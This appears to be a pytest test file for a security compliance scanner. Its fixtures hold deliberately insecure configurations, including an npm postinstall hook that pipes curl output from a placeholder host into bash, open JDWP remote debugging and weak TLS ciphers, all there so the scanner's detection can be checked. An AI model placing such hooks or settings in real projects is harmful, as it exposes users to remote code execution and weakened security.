from __future__ import annotations

import json
import os
from pathlib import Path

from local81.compliance import build_harden_plan, build_inventory, scan_compliance
from local81.compliance.catalog import RULES
from local81.compliance.renderers import render_harden_plan, render_inventory, render_report


def test_compliance_catalog_has_unique_mapped_rules() -> None:
    rule_ids = [rule.rule_id for rule in RULES]
    assert len(rule_ids) == len(set(rule_ids))
    for rule in RULES:
        assert rule.title
        assert rule.severity in {"info", "low", "medium", "high", "critical"}
        assert any(control.startswith("NIST_SP_800_53:") for control in rule.controls)
        assert any(control.startswith("CMS_ARS:") for control in rule.controls)
        assert rule.evidence_sources
        assert rule.remediation


def test_linux_scanner_reads_fixture_root(tmp_path: Path) -> None:
    (tmp_path / "etc/ssh").mkdir(parents=True)
    (tmp_path / "etc/sysctl.d").mkdir(parents=True)
    (tmp_path / "etc/security").mkdir(parents=True)
    (tmp_path / "tmp").mkdir()
    os.chmod(tmp_path / "tmp", 0o777)
    (tmp_path / "etc/os-release").write_text('PRETTY_NAME="Fixture Linux"\n', encoding="utf-8")
    (tmp_path / "etc/ssh/sshd_config").write_text("PermitRootLogin yes\nMaxAuthTries 8\n", encoding="utf-8")
    (tmp_path / "etc/sysctl.d/99-local81.conf").write_text("net.ipv4.ip_forward = 1\nkernel.randomize_va_space = 2\n", encoding="utf-8")
    (tmp_path / "etc/fstab").write_text("tmpfs /tmp tmpfs defaults 0 0\n", encoding="utf-8")
    (tmp_path / "etc/security/pwquality.conf").write_text("minlen = 14\n", encoding="utf-8")

    report = scan_compliance(tmp_path, scope="linux")
    failed_ids = {finding.rule_id for finding in report.findings if finding.status == "fail"}

    assert "L26-LNX-SSH-001" in failed_ids
    assert "L26-LNX-SSH-002" in failed_ids
    assert "L26-LNX-SYSCTL-001" in failed_ids
    assert "L26-LNX-MNT-001" in failed_ids


def test_javascript_and_angular_scanners_flag_static_risks(tmp_path: Path) -> None:
    package = {
        "scripts": {
            "postinstall": "curl https://example.invalid/install.sh | bash",
            "start": "NODE_TLS_REJECT_UNAUTHORIZED=0 node server.js",
        },
        "engines": {"node": ">=18"},
    }
    (tmp_path / "package.json").write_text(json.dumps(package), encoding="utf-8")
    (tmp_path / ".npmrc").write_text("registry=http://registry.example.invalid\nstrict-ssl=false\n_authToken=redacted\n", encoding="utf-8")
    (tmp_path / "angular.json").write_text(
        json.dumps(
            {
                "projects": {
                    "app": {
                        "architect": {
                            "build": {
                                "configurations": {
                                    "production": {
                                        "optimization": False,
                                        "sourceMap": True,
                                    }
                                }
                            }
                        }
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    src = tmp_path / "src"
    src.mkdir()
    (src / "app.component.ts").write_text("this.sanitizer.bypassSecurityTrustHtml(value)\n", encoding="utf-8")

    report = scan_compliance(tmp_path, scope="javascript")
    failed_ids = {finding.rule_id for finding in report.findings if finding.status == "fail"}

    assert "L26-JS-002" in failed_ids
    assert "L26-JS-007" in failed_ids
    assert "L26-JS-011" in failed_ids
    assert "L26-JS-012" in failed_ids
    assert "L26-NODE-002" in failed_ids
    assert "L26-NG-002" in failed_ids
    assert "L26-NG-003" in failed_ids


def test_web_and_java_scanners_flag_static_risks(tmp_path: Path) -> None:
    nginx = tmp_path / "nginx.conf"
    nginx.write_text(
        """
server {
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
  ssl_ciphers HIGH:RC4:MD5;
  server_tokens on;
  access_log off;
}
""",
        encoding="utf-8",
    )
    tomcat = tmp_path / "server.xml"
    tomcat.write_text('<Server port="8005" shutdown="SHUTDOWN"><Connector allowTrace="true" /></Server>\n', encoding="utf-8")
    setenv = tmp_path / "setenv.sh"
    setenv.write_text('CATALINA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,address=*:5005 -Dcom.sun.management.jmxremote.authenticate=false"\n', encoding="utf-8")

    report = scan_compliance(tmp_path, scope="web")
    failed_ids = {finding.rule_id for finding in report.findings if finding.status == "fail"}

    assert "WEB_TLS_PROTOCOLS_MIN_12" in failed_ids
    assert "WEB_TLS_WEAK_CIPHERS_DISABLED" in failed_ids
    assert "WEB_SERVER_TOKENS_MINIMIZED" in failed_ids
    assert "WEB_ACCESS_ERROR_LOGGING_ENABLED" in failed_ids
    assert "TOMCAT_SHUTDOWN_PORT_DISABLED" in failed_ids
    assert "APACHE_TRACE_DISABLED" in failed_ids
    assert "JVM_REMOTE_DEBUG_DISABLED" in failed_ids
    assert "JVM_JMX_SECURED" in failed_ids


def test_renderers_emit_json_and_non_mutating_harden_plan(tmp_path: Path) -> None:
    (tmp_path / "package.json").write_text('{"scripts":{"postinstall":"curl https://e | sh"}}', encoding="utf-8")
    report = scan_compliance(tmp_path, scope="javascript")
    inventory = build_inventory(tmp_path)
    plan = build_harden_plan(report)

    report_json = json.loads(render_report(report, "json"))
    inventory_json = json.loads(render_inventory(inventory, "json"))
    plan_json = json.loads(render_harden_plan(plan, "json"))
    report_markdown = render_report(report, "markdown")
    inventory_markdown = render_inventory(inventory, "markdown")

    assert report_json["schema_version"] == "local81.compliance.report.v0.1"
    assert inventory_json["schema_version"] == "local81.compliance.inventory.v0.1"
    assert plan_json["summary"]["mutating_actions"] == 0
    assert report_markdown.startswith("# Local-81 compliance report")
    assert inventory_markdown.startswith("# Local-81 compliance inventory")
    assert (tmp_path / "package.json").read_text(encoding="utf-8") == '{"scripts":{"postinstall":"curl https://e | sh"}}'
